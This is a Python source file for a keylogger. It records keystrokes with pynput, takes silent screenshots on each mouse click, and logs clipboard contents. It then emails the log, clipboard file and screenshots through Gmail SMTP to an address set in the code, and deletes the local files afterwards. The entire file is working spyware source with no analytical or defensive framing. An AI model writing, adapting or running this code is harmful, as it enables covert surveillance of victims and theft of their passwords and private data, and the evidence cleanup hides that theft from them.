from time import sleep
from pynput import keyboard, mouse
from richxerox import *
import os
import smtplib
from email.message import EmailMessage
import subprocess
import shutil

email_user = "YOUR USERNAME"
email_password = "YOUR PASSWORD"
send_to = "SEND TO EMAIL ADDRESS"

log_file = open("log.txt", "w")
clipboard_file = open("clipboard.txt", "w")

def on_press(key):
    try:
        if key == keyboard.Key.space:
            log_file.write(" ")
        elif key == keyboard.Key.backspace:
            log_file.seek(0, os.SEEK_END) # Move the cursor to the end of the log_file
            pos = log_file.tell() # Get the current position of the cursor
            if pos > 0:
                log_file.seek(pos - 1)
                log_file.truncate() # Delete the last character
        elif key == keyboard.Key.esc:
            pass
        else:
            log_file.write(key.char)
    except AttributeError:
        log_file.write("[" + str(key) + "]")
        
def on_release(key):
    if key == keyboard.Key.esc:
        return False
    
def take_screenshot():
    global count
    filename = f'screenshot{str(count)}.png'
    outfile = os.path.join(folder, filename)
    count += 1
    outcmd = "{} {} {}".format('screencapture', '-x', outfile)
    try:
        subprocess.check_output([outcmd], shell=True)
    except subprocess.CalledProcessError as e:
        print('Error: [%d]\n{}\n'.format(e.returncode, e.output))

def on_click(x, y, button, pressed):
    if pressed:
        take_screenshot()
        
def cleanup():
    shutil.rmtree(folder)
    os.remove("log.txt")
    os.remove("clipboard.txt")

def send_email():
    msg = EmailMessage()
    msg['Subject'] = "Keylogger"
    msg['From'] = email_user
    msg['To'] = send_to
    
    with open("log.txt", 'rb') as f:
        file_data = f.read()
    msg.add_attachment(file_data, maintype='text', subtype='txt', filename="log.txt")
    
    with open("clipboard.txt", 'rb') as f:
        file_data = f.read()
    msg.add_attachment(file_data, maintype='text', subtype='txt', filename="clipboard.txt")
    
    for file in os.listdir(folder):
        with open(folder+"/"+file, 'rb') as f:
            file_data = f.read()
        msg.add_attachment(file_data, maintype='image', subtype='png', filename=file)
        
    with smtplib.SMTP('smtp.gmail.com', 587) as s:
        s.starttls()
        s.login(user = email_user, password= email_password)
        s.sendmail(from_addr = msg["From"], to_addrs= msg["To"], msg = msg.as_string())
        s.quit()

folder = os.path.join(os.getcwd(), 'screenshot_folder')
if os.path.isdir(folder) == False:
    os.mkdir(folder)
    
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener2 = mouse.Listener(on_click=on_click)
listener.start()
listener2.start()
        
text = None
count = 0
while (listener.is_alive()):
    sleep(1)
    if (text == paste(format='text')):
        continue
    text = paste(format='text')
    clipboard_file.write(text+"\n")

listener2.stop()
log_file.close()
clipboard_file.close()
send_email()
cleanup()